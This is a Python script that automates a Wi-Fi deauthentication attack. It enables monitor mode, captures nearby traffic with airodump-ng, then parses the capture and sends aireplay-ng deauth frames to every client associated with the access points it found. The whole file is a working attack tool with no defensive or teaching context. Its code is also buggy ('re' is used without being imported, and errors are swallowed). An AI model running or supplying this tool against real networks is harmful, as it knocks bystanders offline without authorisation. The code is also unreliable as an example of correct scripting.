#!/usr/bin/env python

import subprocess
import time

# Checks if user is root
def check_user():
	try:
		user = subprocess.check_output(["whoami"])
		user = str(user.strip())
		if user == "b'root'":
			print("You are root. Excellent.")
			return True
		else:
			print("Please run as root!")
			print("Exiting..")
			return False
	except OSError:
		print("Could not verify user. Is this a Linux system?")
		exit(1)

# Starts monitor interface
def start_mon():
	try:
		wifi_iface = str(input("Wireless interface: "))
		channel = str(input("Channel (to monitor): "))
	except:
		print("Something went wrong!")

	try:
		p1 = subprocess.Popen(["ip", "link"], stdout=subprocess.PIPE) # Try to find monX
		p2 = subprocess.Popen(["awk", "{print $2}"], stdin=p1.stdout, stdout=subprocess.PIPE)
		output = p2.communicate()[0]
		output=output.split()
		output=str(output)

		#FIX THIS SHIT
		if re.search(r"mon.", output):
			print("Found monitor interface.")
		else:
			derp=subprocess.check_output(["airmon-ng", "start", wifi_iface, channel]) # Start capture
	except:
		print("derp")
	
	try:
		p1 = subprocess.Popen(["ip", "link"], stdout=subprocess.PIPE) # Try to find mon0
		p2 = subprocess.Popen(["awk", "{print $2}"], stdin=p1.stdout, stdout=subprocess.PIPE)
		output = p2.communicate()[0]
		output=output.split()
		output=str(output)
		if "b'mon0:'" in output:
			while True:
				ans = str(input("Found interface mon0. Is this correct? (y/n): "))
				if ans == 'y':
					mon_iface="mon0"
					break
				elif ans == 'n':
					mon_iface = str(input("Monitor interface: "))
					if not mon_iface:
						print("You suck.")
						exit(1)
					else:
						break
		else:
			subprocess.Popen(["airmon-ng"])
			mon_iface = str(input("Monitor interface: "))
		return mon_iface, channel
	except:
		print("Something went wrong!")

# Starts airodump
def start_airodump(iface_ch):
	mon_iface = iface_ch[0]
	channel = iface_ch[1]
	print("We are about to start airodump, saving data into a file.")
	while True:
		fname = input("Filename: ")
		fname = fname.strip()
		if fname:
			break
	while True:
		try:
			duration = int(input("For how long would you like to save data? (in seconds): "))
			if not duration:
				print("Try again.")
			break
		except:
			print("Try again.")
	try:
		print("Collecting data..")
		aa = subprocess.check_output(["airodump-ng", "-c", channel, "-w", fname, mon_iface], timeout=duration).pid
	except:
		print("Done!")
		return fname

def start_aireplay(ap_mac, station_mac, iface_ch):
	mon_iface = iface_ch[0]
	#channel = iface_ch[1]
	try:
		print("Injecting frame into" + str(ap_mac))
		derp = subprocess.check_output(["aireplay-ng", "-0", "1", "-a", ap_mac, "-c", station_mac, "--ignore-negative-one", mon_iface])
	except:
		print("Not sure if everything went okay.. exiting")
		exit(1)
	return True

# MAIN
if not check_user(): # Call function to check if user is root
	exit(1)

# Remind user of killing network-related processes
while True:
	try:
		ans=str(input("Please kill all network-related processes (e.g. wpa_supplicant). Done? (y/n): "))
	except:
		print("Something went wrong!")
	if ans == "n":
		print("Exiting..")
		exit(1)
	elif ans == "y":
		break

iface_ch = start_mon() # Start monitor interface

if len(iface_ch) == 2: # If we got 2 values after starting monitor interface, start airodump
	fname = start_airodump(iface_ch)


f = open(fname + '-01.csv', 'r')
f_data = f.readlines()
f.close()

f_data = f_data[2:]
del f_data[-1]

ap_macs = []
station_macs = {}

i = 0
for line in f_data:
	f_data_temp = line.split(',')
	if f_data_temp[0].strip() == '':
		del f_data[:i]
	else:
		ap_macs.append(f_data_temp[0])
		i=i+1

f_data = f_data[2:]
for line in f_data:
	f_data_temp = line.split(',')
	station_macs[f_data_temp[0]] = f_data_temp[5].strip()

for mac in station_macs:
	if station_macs[mac] in ap_macs:
		start_aireplay(station_macs[mac], mac, iface_ch)
